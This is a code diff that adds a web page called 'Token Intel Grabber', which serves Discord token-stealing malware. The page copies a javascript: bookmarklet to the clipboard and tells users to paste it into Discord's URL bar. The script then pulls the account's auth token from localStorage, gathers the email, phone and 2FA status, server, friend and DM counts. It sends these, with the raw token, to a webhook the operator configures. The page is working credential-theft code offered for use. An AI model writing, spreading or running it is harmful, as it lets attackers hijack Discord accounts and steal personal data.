@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Token Intel Grabber</title>
+    <style>
+        body {
+            background-color: #313338;
+            color: #dbdee1;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background-color: #2b2d31;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+            max-width: 400px;
+            width: 100%;
+        }
+        h2 { color: #f2f3f5; text-align: center; margin-top: 0; }
+        p { font-size: 14px; text-align: center; color: #b5bac1; }
+        button {
+            width: 100%;
+            padding: 15px;
+            border-radius: 8px;
+            border: none;
+            font-size: 16px;
+            font-weight: bold;
+            background-color: #5865F2;
+            color: white;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background 0.2s;
+        }
+        button:hover { background-color: #4752C4; }
+        .steps {
+            text-align: left;
+            background: #1e1f22;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 13px;
+            margin-top: 25px;
+            border-left: 4px solid #5865F2;
+        }
+        .steps ol { margin: 0; padding-left: 20px; }
+        .steps li { margin-bottom: 8px; }
+        code { background: #313338; padding: 2px 6px; border-radius: 4px; color: #f2f3f5; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🕵️ Token Intel Grabber</h2>
+        <p>Tap below to copy the script. It will extract the Email, Account Age, Server Count, and Token, and send it straight to your webhook.</p>
+        
+        <button onclick="copyCode()">📋 Copy Intel Script</button>
+
+        <div class="steps">
+            <b>How to use:</b>
+            <ol>
+                <li>Open <b>Discord</b> in your mobile browser and log into the alt.</li>
+                <li>Tap the address bar, type <code>javascript:</code></li>
+                <li>Paste the code and press Enter.</li>
+                <li>Check your private server for the full intel report!</li>
+            </ol>
+        </div>
+    </div>
+
+    <script>
+        // 🔴 PASTE YOUR WEBHOOK URL HERE
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN";
+
+        function copyCode() {
+            // The script extracts token, fetches user info, servers, friends, and formats it
+            const code = `javascript:(function(){
+                try {
+                    var i=document.createElement('iframe');
+                    document.body.appendChild(i);
+                    var t=i.contentWindow.localStorage.token;
+                    if(t){
+                        t=t.replace(/"/g,'');
+                        const headers = { 'Authorization': t };
+                        
+                        // Fetch User Data, Guilds, Friends, and DMs concurrently
+                        Promise.all([
+                            fetch('https://discord.com/api/v9/users/@me', {headers}).then(r=>r.ok?r.json():{}),
+                            fetch('https://discord.com/api/v9/users/@me/guilds', {headers}).then(r=>r.ok?r.json():[]),
+                            fetch('https://discord.com/api/v9/users/@me/relationships', {headers}).then(r=>r.ok?r.json():[]),
+                            fetch('https://discord.com/api/v9/users/@me/channels', {headers}).then(r=>r.ok?r.json():[])
+                        ]).then(([user, guilds, friends, dms]) => {
+                            if(!user.id) throw new Error("Invalid Token");
+                            
+                            // Calculate Account Creation Date from Snowflake ID
+                            const snowflake = BigInt(user.id);
+                            const creationTimestamp = (snowflake >> 22n) + 1420070400000n;
+                            const creationDate = new Date(Number(creationTimestamp)).toDateString();
+
+                            const email = user.email || 'None';
+                            const phone = user.phone ? '✅ Linked' : '❌ None';
+                            const mfa = user.mfa_enabled ? '✅ Enabled' : '❌ Disabled';
+                            const nitro = user.premium_type ? '✅ Yes' : '❌ No';
+                            const flags = user.public_flags; // Discord Staff, Early Supporter, etc.
+
+                            const payload = {
+                                embeds: [{
+                                    title: '🕵️ Token Intel Report',
+                                    color: 3447003,
+                                    fields: [
+                                        { name: '📧 Email', value: email, inline: true },
+                                        { name: '👤 Username', value: user.username || 'Unknown', inline: true },
+                                        { name: '🆔 User ID', value: user.id, inline: true },
+                                        { name: '📅 Created On', value: creationDate, inline: true },
+                                        { name: '📱 Phone', value: phone, inline: true },
+                                        { name: '🔒 2FA', value: mfa, inline: true },
+                                        { name: '💎 Nitro', value: nitro, inline: true },
+                                        { name: '🌐 Servers', value: guilds.length.toString(), inline: true },
+                                        { name: '👥 Friends', value: friends.length.toString(), inline: true },
+                                        { name: '💬 DMs', value: dms.length.toString(), inline: true },
+                                        { name: '🔑 Token', value: '\\\\\\\`\\\\\\\`\\\\\\\`' + t + '\\\\\\\`\\\\\\\`\\\\\\\`', inline: false }
+                                    ],
+                                    footer: { text: 'Intel Grabber v3.0' },
+                                    timestamp: new Date().toISOString()
+                                }]
+                            };
+
+                            return fetch('${WEBHOOK_URL}', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify(payload)
+                            });
+                        })
+                        .then(() => alert('✅ Intel and Token sent to Discord!'))
+                        .catch(e => alert('❌ Error: ' + e));
+                        
+                    } else {
+                        alert('❌ No token found. Make sure you are logged in and refresh.');
+                    }
+                } catch(e) {
+                    alert('❌ Error: ' + e);
+                }
+            })()`;
+            
+            navigator.clipboard.writeText(code).then(() => {
+                alert("✅ Code Copied! Now go to Discord Web and paste it in the URL bar.");
+            });
+        }
+    </script>
+</body>
+</html>
